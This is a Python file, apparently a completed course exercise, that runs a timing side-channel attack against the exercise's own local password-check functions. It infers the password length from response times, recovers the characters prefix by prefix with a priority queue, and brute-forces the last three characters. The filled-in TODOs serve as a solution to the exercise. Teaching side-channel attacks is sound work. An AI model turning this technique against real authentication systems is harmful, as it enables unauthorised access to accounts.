"""
Python timing side-channel attack task.

Please check the TODOs!
"""


from itertools import product
from string import ascii_letters, digits, punctuation
from timeit import timeit
from typing import Callable, Optional, Tuple
from queue import PriorityQueue

from auth import init_password
# Note: these are the password checking function we're trying to crack!
from auth import check_password1, check_password2


ITERATIONS = 1000
# TODO(1): fill in the missing characters = punctuation
CHARACTERS = ascii_letters + digits + punctuation
BRUTE_FORCE_LIMIT = 3 # chars to brute force at the end
# TODO(2): fill in the correct function
CHECK_PASS_LEN_VULN = check_password1
# TODO(2): fill in the correct function
CHECK_PASS_CHARS_VULN = check_password2


def timed_check_pass(check_password: Callable[[str], bool], password: str, number: int = ITERATIONS) -> float:
    """ Runs & measures the time of the password check function. """
    return timeit(lambda: check_password(password), number=number)


def pad(string: str, length: int) -> str:
    """ Pads the string with spaces until the given length. """
    return string + " " * (length - len(string))


def find_length() -> int:
    """ Timing attack to find the length of the password. """
    times = [
        timed_check_pass(CHECK_PASS_LEN_VULN, " " * length, number=ITERATIONS)
        # TODO(3): fill in an appropriate range
        for length in range(50) 
    ]
    return times.index(max(times))


def find_password() -> Optional[str]:
    length = find_length()
    print("Found length: " + str(length))

    # use a heap to store candidates in reverse timing order
    # https://docs.python.org/3/library/queue.html#queue.PriorityQueue
    q: PriorityQueue[Tuple[float, str]] = PriorityQueue()
    # start from the empty prefix string with the best timing (0)
    q.put((0.0, ""))

    while not q.empty():
        _, p = q.get()
        print("cur prefix: " + p)

        if len(p) != length - BRUTE_FORCE_LIMIT:
            # use depth first search
            for c in CHARACTERS:
                # current password to check
                np = p + c

                # note: PriorityQueue is a min-heap and we need to favor the highest duration
                # hint: you already know the password length
                # TODO(5): do a timed password check
                duration = timed_check_pass(CHECK_PASS_CHARS_VULN, pad(np, length))
                q.put((-duration, np))
        else:
             # Brute force if there are not that many characters left
            print("Note: reached the bruteforce threshold...")
            i = 0
            for chars in product(CHARACTERS, repeat=length - len(p)):
                # current password to bruteforce
                np = p + "".join(chars)
                if i >= 7000:
                    # a helpful still-in-progress message
                    print("brute forcing: " + np)
                    i = 0
                # TODO(4): check for exit condition
                if check_password2(np) == True:
                    return np

                i += 1

    return None


if __name__ == "__main__":
    init_password()
    p = find_password()
    if p:
        print("FOUND: " + p)
    else:
        print("Not found :( ")
